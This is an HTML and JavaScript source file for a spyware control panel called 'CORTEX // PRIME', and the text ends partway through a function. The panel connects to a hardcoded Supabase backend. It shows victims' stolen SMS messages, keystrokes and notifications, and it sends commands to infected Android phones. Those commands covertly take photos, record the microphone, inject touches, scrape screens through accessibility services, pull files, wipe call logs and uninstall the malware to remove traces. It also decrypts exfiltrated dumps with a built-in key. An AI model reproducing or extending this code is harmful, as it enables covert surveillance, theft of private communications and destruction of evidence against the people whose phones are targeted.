<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>CORTEX // PRIME</title>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg: #050505;
            --surface: #0f1012;
            --surface-light: #1a1c20;
            --primary: #00f3ff;
            --secondary: #7000ff;
            --danger: #ff003c;
            --success: #00ff9d;
            --text: #c0c0c0;
            --grid: rgba(0, 243, 255, 0.05);
        }

        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        
        body {
            background-color: var(--bg);
            color: var(--text);
            font-family: 'Share Tech Mono', monospace;
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;            flex-direction: column;
            overflow: hidden;
            background-image: 
                linear-gradient(var(--grid) 1px, transparent 1px),
                linear-gradient(90deg, var(--grid) 1px, transparent 1px);
            background-size: 20px 20px;
        }

        header {
            background: rgba(5, 5, 5, 0.9);
            backdrop-filter: blur(10px);
            padding: 15px;
            border-bottom: 1px solid var(--primary);
            display: flex;
            justify-content: space-between;
            align-items: center;
            z-index: 10;
            box-shadow: 0 0 15px rgba(0, 243, 255, 0.2);
        }

        .logo { font-size: 1.2rem; color: var(--primary); text-shadow: 0 0 5px var(--primary); letter-spacing: 2px; }

        .status-dot {
            height: 8px; width: 8px; background-color: var(--danger);
            border-radius: 50%; box-shadow: 0 0 5px var(--danger);
            animation: pulse 2s infinite;
        }
        .status-dot.online { background-color: var(--success); box-shadow: 0 0 5px var(--success); }

        main { flex: 1; overflow-y: auto; padding: 20px; padding-bottom: 80px; }

        .section { display: none; animation: fadeIn 0.3s ease; }
        .section.active { display: block; }

        h2 {
            color: var(--bg); background: var(--primary);
            padding: 5px 10px; display: inline-block;
            font-size: 0.9rem; margin-top: 0; margin-bottom: 15px;
            text-transform: uppercase; clip-path: polygon(0 0, 100% 0, 90% 100%, 0% 100%);
        }

        .card { background: var(--surface); border: 1px solid var(--surface-light); border-left: 2px solid var(--primary); padding: 15px; margin-bottom: 15px; position: relative; }
        .device-row { display: flex; align-items: center; justify-content: space-between; padding: 12px; border-bottom: 1px solid #222; cursor: pointer; transition: 0.2s; }
        .device-row:hover { background: rgba(0, 243, 255, 0.05); }
        .device-row.selected { border-left: 4px solid var(--primary); background: rgba(0, 243, 255, 0.1); }
        .device-info { flex: 1; }
        .checkbox { width: 18px; height: 18px; border: 1px solid var(--primary); margin-right: 12px; display: flex; align-items: center; justify-content: center; font-size: 12px; }
        .selected .checkbox::after { content: '✔'; color: var(--primary); }

        .stat-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; }
        .stat-item label { display: block; font-size: 0.7rem; color: #666; }
        .stat-item span { font-size: 1.1rem; color: #fff; }

        .cmd-row { display: flex; flex-direction: column; gap: 8px; margin-bottom: 15px; }
        .cmd-label { color: var(--primary); font-size: 0.75rem; text-transform: uppercase; letter-spacing: 1px; }
        
        .input-wrap { display: flex; gap: 5px; }
        input, textarea {
            flex: 1; background: #000; border: 1px solid var(--surface-light);
            color: var(--primary); padding: 8px 12px; font-family: inherit; font-size: 0.85rem;
        }
        textarea { min-height: 60px; resize: vertical; }

        .btn {
            background: var(--surface-light); border: 1px solid var(--primary);
            color: var(--primary); padding: 8px 15px; font-family: inherit;
            font-size: 0.8rem; cursor: pointer; text-transform: uppercase;
            transition: all 0.2s; clip-path: polygon(5px 0, 100% 0, 100% calc(100% - 5px), calc(100% - 5px) 100%, 0 100%, 0 5px);
        }
        .btn:active { transform: scale(0.95); background: var(--primary); color: #000; }
        .btn.danger { border-color: var(--danger); color: var(--danger); }
        .btn.danger:active { background: var(--danger); color: #fff; }

        .btn-status { width: 30px; background: rgba(0, 243, 255, 0.1); border: 1px solid #333; color: var(--primary); font-size: 0.6rem; cursor: pointer; display: flex; align-items: center; justify-content: center; transition: 0.2s; }
        .btn-status:hover { border-color: var(--primary); }

        #toast-container { position: fixed; top: 80px; right: 20px; z-index: 1000; pointer-events: none; }
        .toast { background: var(--surface); border-left: 4px solid var(--primary); padding: 12px 20px; margin-bottom: 10px; font-size: 0.8rem; box-shadow: 0 5px 15px rgba(0,0,0,0.5); animation: toastIn 0.3s ease forwards; opacity: 0; }
        @keyframes toastIn { from { transform: translateX(100%); opacity: 0; } to { transform: translateX(0); opacity: 1; } }

        #status-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 2000; display: none; flex-direction: column; padding: 20px; overflow-y: auto; backdrop-filter: blur(15px); }
        .viewer-card { background: var(--surface); border: 1px solid #333; margin-bottom: 10px; padding: 12px; border-left: 3px solid var(--primary); }
        .viewer-tag { font-size: 0.65rem; padding: 2px 6px; background: rgba(0,243,255,0.1); color: var(--primary); margin-right: 8px; border-radius: 3px; }
        .viewer-ts { font-size: 0.65rem; color: #555; float: right; }
        .viewer-media { max-width: 100%; border: 1px solid var(--primary); box-shadow: 0 0 15px rgba(0,243,255,0.2); margin: 20px 0; }
        audio::-webkit-media-controls-panel { background-color: var(--surface-light); }
        .json-key { color: var(--primary); font-weight: bold; }
        .json-val { color: var(--text); }

        .log-entry { font-size: 0.8rem; padding: 8px; border-bottom: 1px solid #222; display: flex; justify-content: space-between; }
        .log-time { color: #666; font-size: 0.7rem; }
        .log-tag { color: var(--secondary); margin-right: 5px; }

        nav { position: fixed; bottom: 0; left: 0; width: 100%; background: var(--surface); border-top: 1px solid #333; display: flex; justify-content: space-around; padding: 15px 0; z-index: 100; }
        .nav-item { color: #666; font-size: 1.5rem; cursor: pointer; position: relative; }
        .nav-item.active { color: var(--primary); text-shadow: 0 0 10px var(--primary); }

        #loader { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 999; display: flex; justify-content: center; align-items: center; flex-direction: column; }
        .scanline { width: 100%; height: 2px; background: var(--primary); position: absolute; animation: scan 2s linear infinite; opacity: 0.3; }

        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        @keyframes scan { 0% { top: 0%; } 100% { top: 100%; } }
    </style>
</head>
<body>

    <div id="toast-container"></div>
    <div id="status-overlay">
        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:15px;">
            <h2 id="status-title" style="margin:0">COMMAND AUDIT</h2>
            <div onclick="document.getElementById('status-overlay').style.display='none'" style="font-size:2rem; color:var(--primary); cursor:pointer; padding:0 10px;">×</div>
        </div>
        <div id="status-content" style="flex:1" onclick="event.stopPropagation()"></div>
        <button class="btn" style="margin-top:20px" onclick="document.getElementById('status-overlay').style.display='none'">CLOSE VIEW</button>
    </div>

    <div id="loader">
        <div style="color: var(--primary); font-size: 1.5rem; letter-spacing: 5px;">SYNCING...</div>
        <div style="color: #666; margin-top: 10px; font-size: 0.8rem;">UPLINK ESTABLISHED</div>
    </div>

    <header>
        <div class="logo">CORTEX // PRIME</div>
        <div id="connectionStatus" class="status-dot"></div>
    </header>

    <main>
        <div id="view-dash" class="section active">
            <div style="display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 5px;">
                <h2>Active Device Cluster</h2>
                <button class="btn" onclick="fetchLatest()" style="font-size: 0.6rem; padding: 4px 8px;">REFRESH SCAN</button>
            </div>
            <div class="card" id="device-list-container" style="padding:0; max-height: 300px; overflow-y: auto;">
                <div style="padding:20px; text-align:center; color:#444;">Scanning for signals...</div>
            </div>
            
            <div id="multi-select-bar" style="display:none; margin-bottom:15px; gap:10px;">
                 <button class="btn" onclick="selectAll(true)">Select All</button>
                 <button class="btn" onclick="selectAll(false)">Clear</button>
            </div>

            <h2>Telemetry Feed <span id="feed-target-label" style="font-size:0.6rem; color:var(--primary); opacity:0.6;"></span></h2>
            <div class="card" id="feed-container" style="max-height: 350px; overflow-y: auto;">
                <div style="text-align: center; color: #444;">Select a device to view feed</div>
            </div>
        </div>

        <div id="view-cmd" class="section">
            <h2>Interference</h2>
            <div class="card">
                <div class="cmd-row"><label class="cmd-label">User Alert</label><div class="input-wrap"><button class="btn-status" onclick="auditCmd('TOAST')">?</button><input type="text" id="val-toast" placeholder="Toast msg..."><button class="btn" onclick="sendCmd('TOAST')">Toast</button></div></div>
                <div class="cmd-row"><label class="cmd-label">Sonic Alarm</label><div class="input-wrap"><button class="btn-status" onclick="auditCmd('RING')">?</button><input type="number" id="val-ring" placeholder="Secs (e.g. 10)"><button class="btn" onclick="sendCmd('RING')">Ring</button></div></div>
                <div class="cmd-row"><label class="cmd-label">Force Wake (Screen Ignite)</label><div class="input-wrap"><button class="btn-status" onclick="auditCmd('WAKE')">?</button><select id="val-wake" style="flex:1; background:#000; color:var(--primary); border:1px solid var(--surface-light); padding:8px;"><option value="standard">Standard Wake</option><option value="wellbeing">Route to Wellbeing</option></select><button class="btn" onclick="sendCmd('WAKE')">Ignite</button></div></div>
                <div class="cmd-row">
                    <label class="cmd-label">Remote Intent</label>
                    <input type="text" id="int-act" value="android.intent.action.VIEW" placeholder="Action">
                    <input type="text" id="int-data" placeholder="Data (URL/URI)">
                    <div class="input-wrap">
                        <button class="btn-status" onclick="auditCmd('RUN_INTENT')">?</button>
                        <select id="int-tgt" style="flex:1; background:#000; color:var(--primary); border:1px solid var(--surface-light); padding:8px;">
                            <option value="activity">Activity</option>
                            <option value="service">Service</option>
                            <option value="broadcast">Broadcast</option>
                        </select>
                        <button class="btn" onclick="sendCmd('RUN_INTENT')">Run</button>
                    </div>
                </div>
            </div>

            <h2>Surveillance (Optical / Audio)</h2>
            <div class="card">
                <div class="cmd-row">
                    <label class="cmd-label">Optical Capture</label>
                    <div class="input-wrap">
                        <button class="btn-status" onclick="auditCmd('CAPTURE_IMAGE')">?</button>
                        <select id="cam-side" style="width:80px; background:#000; color:var(--primary); border:1px solid var(--surface-light);"><option value="REAR">Rear</option><option value="FRONT">Front</option></select>
                        <input type="number" id="cam-count" value="1" placeholder="Qty" style="width:60px">
                        <button class="btn" onclick="sendCmd('CAPTURE_IMAGE')">Capture</button>
                    </div>
                </div>
                <div class="cmd-row">
                    <label class="cmd-label">Acoustic Snippet</label>
                    <div class="input-wrap">
                        <button class="btn-status" onclick="auditCmd('RECORD_VOICE')">?</button>
                        <input type="number" id="mic-dur" value="10" placeholder="Secs">
                        <button class="btn" onclick="sendCmd('RECORD_VOICE')">Record Mic</button>
                    </div>
                </div>
                <div class="cmd-row">
                    <label class="cmd-label">Ghost Interaction (Remote Touch)</label>
                    <div class="input-wrap">
                        <button class="btn-status" onclick="auditCmd('REMOTE_TOUCH')">?</button>
                        <select id="touch-act" style="flex:1; background:#000; color:var(--primary); border:1px solid var(--surface-light);">
                            <option value="NAV|BACK">Nav: Back</option>
                            <option value="NAV|HOME">Nav: Home</option>
                            <option value="NAV|RECENTS">Nav: Recents</option>
                            <option value="TAP">Custom Tap (X,Y)</option>
                        </select>
                        <input type="text" id="touch-val" placeholder="Params (if tap)" style="width:100px">
                        <button class="btn" onclick="sendCmd('REMOTE_TOUCH')">Send</button>
                    </div>
                </div>
            </div>

            <h2>Data Extraction & Forensics</h2>
            <div class="card">
                <div class="cmd-row">
                    <label class="cmd-label">Accessibility Audit (UI Scraper)</label>
                    <div class="input-wrap">
                        <button class="btn-status" onclick="auditCmd('GET_TREE')">?</button>
                        <input type="text" id="tree-pkg" placeholder="Package (null for all)">
                        <input type="number" id="tree-dur" value="1" placeholder="Mins" style="width:80px">
                        <button class="btn" onclick="sendCmd('GET_TREE')">Audit</button>
                    </div>
                </div>
                <div class="cmd-row">
                    <label class="cmd-label">Call Log Sanitizer</label>
                    <div class="input-wrap">
                        <button class="btn-status" onclick="auditCmd('PHONE_LOGS')">?</button>
                        <select id="call-act" style="flex:1; background:#000; color:var(--primary); border:1px solid var(--surface-light);">
                            <option value="CLEAR_ALL">Wipe All Logs</option>
                            <option value="DELETE_LAST">Wipe Last (Mins)</option>
                            <option value="DELETE_NUM">Wipe Number</option>
                        </select>
                        <input type="text" id="call-val" placeholder="Val" style="width:80px">
                        <button class="btn" onclick="sendCmd('PHONE_LOGS')">Sanitize</button>
                    </div>
                </div>
                <div class="cmd-row"><label class="cmd-label">Forensic File Pull</label><div class="input-wrap"><button class="btn-status" onclick="auditCmd('PULL_FILE')">?</button><input type="text" id="val-pull" placeholder="/sdcard/Download/file.jpg"><button class="btn" onclick="sendCmd('PULL_FILE')">Fetch</button></div></div>
                <div class="cmd-row"><label class="cmd-label">Storage Indexer (Depth)</label><div class="input-wrap"><button class="btn-status" onclick="auditCmd('GET_SKELETON')">?</button><input type="number" id="val-skeleton" value="5" placeholder="Depth" style="width:80px"><button class="btn" onclick="sendCmd('GET_SKELETON')">Index</button></div></div>
                <div class="cmd-row"><label class="cmd-label">Vault Integrity</label><div class="input-wrap"><button class="btn-status" onclick="auditCmd('GET_VAULT_SIZE')">?</button><div style="flex:1; display:flex; gap:5px;"><button class="btn" style="flex:1" onclick="sendCmd('GET_VAULT_SIZE')">Check Size</button><button class="btn" style="flex:1" onclick="sendCmd('UPLOAD_DUMPS')">Sync Dumps</button></div></div></div>
                <div class="cmd-grid" style="display:grid; grid-template-columns:1fr 1fr; gap:8px;">
                    <button class="btn" onclick="sendCmd('GET_LOGS')">Diag Logs</button>
                </div>
            </div>

            <h2>Maintenance</h2>
            <div class="card">
                <div class="cmd-row"><label class="cmd-label">Burst Mode (Stay Ready)</label><div class="input-wrap"><input type="number" id="val-burst" placeholder="Mins (e.g. 15)"><button class="btn" onclick="sendCmd('STAY_READY')">Activate</button></div></div>
                <div class="cmd-row"><label class="cmd-label">Work Cycle</label><div class="input-wrap"><input type="number" id="val-work" placeholder="Mins (Min 15)"><button class="btn" onclick="sendCmd('SET_INTERVAL')">Set</button></div></div>
                <div class="cmd-row">
                    <label class="cmd-label">Feature Control</label>
                    <div class="input-wrap">
                        <input type="text" id="tog-feat" placeholder="Feature (e.g. location)">
                        <select id="tog-state" style="background:#000; color:var(--primary); border:1px solid var(--surface-light);">
                            <option value="on">ON</option>
                            <option value="off">OFF</option>
                        </select>
                        <input type="number" id="tog-dur" value="0" placeholder="Mins" style="width:70px">
                        <button class="btn" onclick="sendCmd('TOGGLE_FEATURE')">Set</button>
                    </div>
                </div>
                <button class="btn" style="width:100%" onclick="sendCmd('FORCE_UPLOAD', 'ALL')">Emergency Cloud Sync (ALL)</button>
            </div>

            <h2 style="background: var(--danger)">Crisis Management</h2>
            <div class="card" style="border-color: var(--danger)">
                <div class="cmd-row">
                    <label class="cmd-label">Code Red (Beacon)</label>
                    <div class="input-wrap">
                        <input type="text" id="cr-code" value="0" placeholder="Codes" style="width:60px">
                        <input type="number" id="cr-dur" value="15" placeholder="Mins">
                        <input type="number" id="cr-freq" value="30" placeholder="Freq(s)">
                        <button class="btn danger" onclick="sendCmd('CODERED')">Trigger</button>
                    </div>
                </div>
                <div class="cmd-grid" style="display:grid; grid-template-columns:1fr 1fr; gap:8px;">
                    <button class="btn danger" onclick="sendCmd('STOP_BEACON')">Dark Mode</button>
                    <button class="btn danger" onclick="if(confirm('PURGE DATA & UNINSTALL?')) sendCmd('NUKE')">Nuke Target</button>
                </div>
            </div>
        </div>

        <div id="view-files" class="section">
            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
                <h2>Data Vault</h2>
                <button class="btn" id="vault-back-btn" onclick="vaultBack()" style="display:none; font-size:0.6rem;">← BACK</button>
            </div>
            <div id="vault-path-display" style="font-size: 0.6rem; color: var(--primary); margin-bottom: 10px; opacity: 0.5; overflow: hidden; text-overflow: ellipsis;">ROOT://</div>
            <div id="file-list"></div>
        </div>
    </main>

    <nav>
        <div class="nav-item active" onclick="switchTab('dash')">📊</div>
        <div class="nav-item" onclick="switchTab('cmd')">🎮</div>
        <div class="nav-item" onclick="switchTab('files')">💾</div>
    </nav>

    <script>
        const SUPABASE_URL = 'https://xvldfsmxskhemkslsbym.supabase.co';
        const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inh2bGRmc214c2toZW1rc2xzYnltIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjI2ODgxNzksImV4cCI6MjA3ODI2NDE3OX0.5arqrx8Tt7v-hpXpo_ncoK4IX8th9IibxAuv93SSoOU';
        const sb = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
        let selectedDeviceIds = new Set();
        let allDevices = [];
        let currentVaultPath = "";

        window.onload = async () => {
            setTimeout(() => { document.getElementById('loader').style.display = 'none'; }, 1000);
            await fetchLatest();
            setInterval(fetchLatest, 5000);
            fetchFiles(); // Initial load
        };

        function switchTab(tab) {
            document.querySelectorAll('.section').forEach(el => el.classList.remove('active'));
            document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
            document.getElementById('view-' + tab).classList.add('active');
            const icons = ['dash', 'cmd', 'files'];
            document.querySelectorAll('.nav-item')[icons.indexOf(tab)].classList.add('active');
        }

        async function fetchLatest() {
            const { data } = await sb.from('device_stats').select('*').order('created_at', { ascending: false }).limit(50);
            if (data) {
                // Group by Unique Device ID
                const uniqueMap = new Map();
                data.forEach(stat => {
                    if (!uniqueMap.has(stat.device_id)) uniqueMap.set(stat.device_id, stat);
                });
                allDevices = Array.from(uniqueMap.values());
                renderDeviceList();
                
                // Handle Connection Status Dot (Global)
                const dot = document.getElementById('connectionStatus');
                const isAnyOnline = allDevices.some(d => (new Date() - new Date(d.created_at)) < 90000);
                dot.className = 'status-dot ' + (isAnyOnline ? 'online' : '');

                // Update Feed for the first selected device or latest overall
                if (selectedDeviceIds.size > 0) {
                    const firstId = Array.from(selectedDeviceIds)[0];
                    const target = allDevices.find(d => d.device_id === firstId);
                    if (target) updateFeed(target);
                }
            }
        }

        function selectAll(mode) {
            if (mode) allDevices.forEach(d => selectedDeviceIds.add(d.device_id));
            else selectedDeviceIds.clear();
            renderDeviceList();
        }

        function toggleDevice(id) {
            if (selectedDeviceIds.has(id)) selectedDeviceIds.delete(id);
            else selectedDeviceIds.add(id);
            renderDeviceList();
        }

        function renderDeviceList() {
            const container = document.getElementById('device-list-container');
            document.getElementById('multi-select-bar').style.display = 'flex';
            
            container.innerHTML = allDevices.map(dev => {
                const isSelected = selectedDeviceIds.has(dev.device_id);
                const diff = Math.floor((new Date() - new Date(dev.created_at)) / 1000);
                const statusText = diff > 60 ? Math.floor(diff/60) + 'm' : diff + 's';
                const isOnline = diff < 90;
                
                return `
                    <div class="device-row ${isSelected ? 'selected' : ''}" onclick="toggleDevice('${dev.device_id}')">
                        <div class="checkbox"></div>
                        <div class="device-info">
                            <div style="color:#fff; font-size:0.9rem;">${dev.device_model || 'Unknown'} <span style="color:${isOnline ? 'var(--success)' : '#444'}; font-size:0.6rem;">● ${statusText}</span></div>
                            <div style="color:#666; font-size:0.7rem;">${dev.device_id.substring(0,12)}...</div>
                        </div>
                        <div style="color:var(--primary); font-size:0.8rem;">${dev.battery_level || 0}%</div>
                    </div>
                `;
            }).join('');
        }

        function updateFeed(dev) {
            const container = document.getElementById('feed-container');
            document.getElementById('feed-target-label').innerText = `// TARGET: ${dev.device_model}`;
            const logs = [];
            if (dev.sms_logs) dev.sms_logs.forEach(x => logs.push({tag:'SMS', val:x.body, ts:x.timestamp || dev.created_at, col:'var(--success)'}));
            if (dev.typing_history) dev.typing_history.forEach(x => logs.push({tag:'KEY', val:`[${x.pkg}] ${x.txt}`, ts:x.end_ts || dev.created_at, col:'var(--primary)'}));
            if (dev.notif_history) dev.notif_history.forEach(x => logs.push({tag:'NTF', val:`${x.pkg}: ${x.title}`, ts:x.ts || dev.created_at, col:'var(--secondary)'}));
            
            logs.sort((a,b) => b.ts - a.ts);
            container.innerHTML = logs.slice(0, 25).map(l => `
                <div class="log-entry">
                    <div><span class="log-tag" style="color:${l.col}">[${l.tag}]</span> ${l.val.substring(0,40)}</div>
                    <div class="log-time">${new Date(l.ts).toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'})}</div>
                </div>
            `).join('') || '<div style="text-align:center; color:#444">Idle</div>';
        }

        async function sendCmd(type, forcedVal = null) {
            if (selectedDeviceIds.size === 0) return alert("NO TARGETS SELECTED");
            
            let content = forcedVal;
            if (content === null) {
                switch(type) {
                    case 'TOAST': content = document.getElementById('val-toast').value; break;
                    case 'RING': content = document.getElementById('val-ring').value; break;
                    case 'STAY_READY': content = document.getElementById('val-burst').value; break;
                    case 'SET_INTERVAL': content = document.getElementById('val-work').value; break;
                    case 'PULL_FILE': content = document.getElementById('val-pull').value; break;
                    case 'RUN_INTENT':
                        const intObj = {};
                        const act = document.getElementById('int-act').value;
                        const dat = document.getElementById('int-data').value;
                        const tgt = document.getElementById('int-tgt').value;
                        if (act) intObj.action = act;
                        if (dat) intObj.data = dat;
                        if (tgt) intObj.target = tgt;
                        content = JSON.stringify(intObj); break;
                    case 'GET_TREE':
                        const pkg = document.getElementById('tree-pkg').value || 'null';
                        const dur = document.getElementById('tree-dur').value || '5';
                        content = `${pkg}|${dur}`; break;
                    case 'TOGGLE_FEATURE':
                        content = `${document.getElementById('tog-feat').value}:${document.getElementById('tog-state').value}:${document.getElementById('tog-dur').value}`; break;
                    case 'CODERED':
                        content = `${document.getElementById('cr-code').value}-${document.getElementById('cr-dur').value}-${document.getElementById('cr-freq').value}`; break;
                    case 'CAPTURE_IMAGE':
                        content = `${document.getElementById('cam-side').value}|${document.getElementById('cam-count').value}`; break;
                    case 'RECORD_VOICE':
                        content = document.getElementById('mic-dur').value; break;
                    case 'GET_SKELETON':
                        content = document.getElementById('val-skeleton').value || '5'; break;
                    case 'GET_VAULT_SIZE':
                        content = ''; break;
                    case 'GET_VAULT_SIZE':
                        content = ''; break;
                    case 'WAKE':
                        content = document.getElementById('val-wake').value; break;
                    case 'REMOTE_TOUCH':
                        const tAct = document.getElementById('touch-act').value;
                        let tVal = document.getElementById('touch-val').value;
                        // Hardening: Convert '500, 1200' or '500 1200' to '500|1200' reliably
                        if (tAct === 'TAP') tVal = tVal.trim().replace(/[\s,]+/g, '|');
                        content = tAct.includes('|') ? tAct : `${tAct}|${tVal}`; break;
                    case 'PHONE_LOGS':
                        content = `${document.getElementById('call-act').value}|${document.getElementById('call-val').value}`; break;
                }
            }

            const commands = Array.from(selectedDeviceIds).map(id => ({
                device_id: id, file_name: type, content: String(content || ''), status: 'PENDING'
            }));

            const { error } = await sb.from('file_commands').insert(commands);
            if (error) toast("UPLINK ERROR: " + error.message, "danger");
            else toast(`${type} BROADCAST TO ${selectedDeviceIds.size} TARGETS`, "success");
        }

        function toast(msg, type = 'success') {
            const container = document.getElementById('toast-container');
            const t = document.createElement('div');
            t.className = 'toast';
            t.style.borderLeftColor = type === 'success' ? 'var(--success)' : 'var(--danger)';
            t.innerText = msg;
            container.appendChild(t);
            setTimeout(() => { t.style.opacity = '0'; setTimeout(() => t.remove(), 300); }, 3000);
        }

        async function auditCmd(type) {
            if (selectedDeviceIds.size === 0) return toast("SELECT TARGETS TO AUDIT", "danger");
            
            document.getElementById('status-title').innerText = `CLUSTER AUDIT: ${type}`;
            document.getElementById('status-content').innerHTML = '<div style="padding:20px; text-align:center;">FETCHING CLUSTER DATA...</div>';
            document.getElementById('status-overlay').style.display = 'flex';

            const { data, error } = await sb.from('file_commands')
                .select('*')
                .eq('file_name', type)
                .in('device_id', Array.from(selectedDeviceIds))
                .order('created_at', { ascending: false })
                .limit(15);

            if (error) return document.getElementById('status-content').innerHTML = `Error: ${error.message}`;

            document.getElementById('status-content').innerHTML = data.map(c => {
                let statusCol = 'var(--text)';
                if (c.status === 'PENDING') statusCol = '#f59e0b';
                if (c.status === 'RECEIVED') statusCol = 'var(--primary)';
                if (c.status === 'EXECUTED' || c.status.includes('SUCCESS')) statusCol = 'var(--success)';
                if (c.status.includes('FAILED') || c.status.includes('ERROR')) statusCol = 'var(--danger)';

                return `
                    <div class="card" style="margin-bottom:10px; border-left-color: ${statusCol}">
                        <div style="display:flex; justify-content:space-between; font-size:0.7rem; color:#666; margin-bottom:5px;">
                            <span>ID: ${c.device_id.substring(0,8)}...</span>
                            <span>${new Date(c.created_at).toLocaleString()}</span>
                        </div>
                        <div style="font-size:0.85rem; font-weight:bold; color:${statusCol}">${c.status}</div>
                        <div style="font-size:0.75rem; color:#aaa; margin-top:5px; background:rgba(0,0,0,0.3); padding:5px;">${c.content.substring(0,60)}${c.content.length > 60 ? '...' : ''}</div>
                        ${c.error_log ? `<div style="color:var(--danger); font-size:0.7rem; margin-top:5px;">ERROR: ${c.error_log}</div>` : ''}
                        ${c.result_data ? `<div style="color:var(--primary); font-size:0.7rem; margin-top:5px; font-family:monospace;">RESULT: ${
c.result_data.size_report || JSON['stringify'](c.result_data)}</div>` : ''}
                    </div>
                `;
            }).join('') || '<div style="padding:40px; text-align:center; color:#444;">NO COMMAND HISTORY FOR SELECTED CLUSTER</div>';
        }

        async function fetchFiles() {
            const list = document.getElementById('file-list');
            const backBtn = document.getElementById('vault-back-btn');
            const pathDisplay = document.getElementById('vault-path-display');
            
            pathDisplay.innerText = "ROOT://" + currentVaultPath;
            backBtn.style.display = currentVaultPath === "" ? "none" : "block";

            const { data, error } = await sb.storage.from('cortex-vault').list(currentVaultPath, {
                limit: 100,
                offset: 0,
                sortBy: { column: 'name', order: 'asc' }
            });

            if (error) {
                list.innerHTML = `<div style="color:var(--danger); padding:20px;">STORAGE_ERROR: ${error.message}</div>`;
                return;
            }

            if (!data || data.length === 0) {
                list.innerHTML = `<div style="text-align:center; padding:40px; color:#444;">DIRECTORY_EMPTY</div>`;
                return;
            }

            list.innerHTML = data.map(item => {
                // In Supabase storage list, items without metadata are folders
                const isFolder = !item.metadata;
                const icon = isFolder ? "📁" : "📄";
                const action = isFolder 
                    ? `onclick="enterFolder('${item.name}')"` 
                    : `onclick="viewFile('${item.name}')"`;

                return `
                    <div class="card" ${action} style="display:flex; justify-content:space-between; align-items:center; cursor:pointer; border-left-color:${isFolder ? 'var(--secondary)' : 'var(--primary)'}">
                        <div style="display:flex; align-items:center; gap:12px;">
                            <span style="font-size:1.2rem;">${icon}</span>
                            <div>
                                <div style="color: ${isFolder ? 'var(--text)' : 'var(--primary)'}; font-size:0.85rem;">${item.name}</div>
                                <div style="font-size:0.6rem; color:#555;">${isFolder ? 'DIRECTORY' : formatBytes(item.metadata.size)}</div>
                            </div>
                        </div>
                        <div style="color:#444; font-size:0.8rem;">›</div>
                    </div>
                `;
            }).join('');
        }

        function enterFolder(name) {
            currentVaultPath += (currentVaultPath === "" ? "" : "/") + name;
            fetchFiles();
        }

        function vaultBack() {
            const parts = currentVaultPath.split('/');
            parts.pop();
            currentVaultPath = parts.join('/');
            fetchFiles();
        }

        async function viewFile(name) {
            const fullPath = currentVaultPath ? `${currentVaultPath}/${name}` : name;
            const ext = name.split('.').pop().toLowerCase();
            toast("DECRYPTING & RENDERING...", "success");

            try {
                const { data, error } = await sb.storage.from('cortex-vault').createSignedUrl(fullPath, 60);
                if (error) throw error;

                const response = await fetch(data.signedUrl);
                if (!response.ok) throw new Error(`HTTP ${response.status}`);

                const buffer = await response.arrayBuffer();
                let contentHtml = "";
                let processedData = null;

                if (ext === 'ctx') {
                    processedData = await decryptCtx(buffer);
                    contentHtml = renderIntelligence(processedData);
                } else if (ext === 'gz') {
                    const text = await decompressGzip(buffer);
                    contentHtml = renderLogs(text);
                } else if (['jpg', 'jpeg', 'png', 'webp', 'gif'].includes(ext)) {
                    const blob = new Blob([buffer]);
                    contentHtml = `<img src="${URL.createObjectURL(blob)}" class="viewer-media">`;
                } else if (['m4a', 'mp3', 'wav', 'aac'].includes(ext)) {
                    const blob = new Blob([buffer]);
                    contentHtml = `<audio controls src="${URL.createObjectURL(blob)}" class="viewer-media" style="width:100%"></audio>`;
                } else {
                    const text = new TextDecoder().decode(buffer);
                    contentHtml = `<pre style="color:var(--primary); font-size:0.7rem; white-space:pre-wrap;">${text}</pre>`;
                }

                document.getElementById('status-title').innerText = `DATA_VIEWER: ${name}`;
                document.getElementById('status-content').innerHTML = contentHtml;
                document.getElementById('status-overlay').style.display = 'flex';
                toast("VIEWER_READY", "success");
            } catch (err) {
                console.error(err);
                toast("VIEWER_ERROR: " + err.message, "danger");
            }
        }

        async function decryptCtx(buffer) {
            const keyBytes = new TextEncoder().encode("C0rtexS3cr3tK3y!");
            const iv = buffer.slice(0, 12);
            const ciphertext = buffer.slice(12);
            
            const cryptoKey = await crypto.subtle.importKey("raw", keyBytes, { name: "AES-GCM" }, false, ["decrypt"]);
            const decrypted = await crypto.subtle.decrypt({ name: "AES-GCM", iv: iv }, cryptoKey, ciphertext);
            
            const decompressed = await decompressGzip(decrypted);
            return JSON.parse(decompressed);
        }

        async function decompressGzip(buffer) {
            const ds = new DecompressionStream("gzip");
            const writer = ds.writable.getWriter();
            writer.write(buffer);
            writer.close();
            const response = new Response(ds.readable);
            return await response.text();
        }

        function renderIntelligence(data) {
            let html = `<div style="margin-bottom:20px; color:var(--success); border-bottom:1px solid #333; padding-bottom:10px">INTEL_REPORT: ${data.device_model || 'GENERIC'}</div>`;
            
            const sections = {
                "IDENTITY": data.static || {},
                "HEALTH": data.health || data.app_health || {},
                "FORENSICS": { 
                    "Contacts": data.contacts?.length || 0, 
                    "Calls": data.calls?.length || 0, 
                    "Apps": data.apps?.length || 0 
                }
            };

            for (const [title, obj] of Object.entries(sections)) {
                html += `<h2 style="font-size:0.7rem; margin-top:15px">${title}</h2>`;
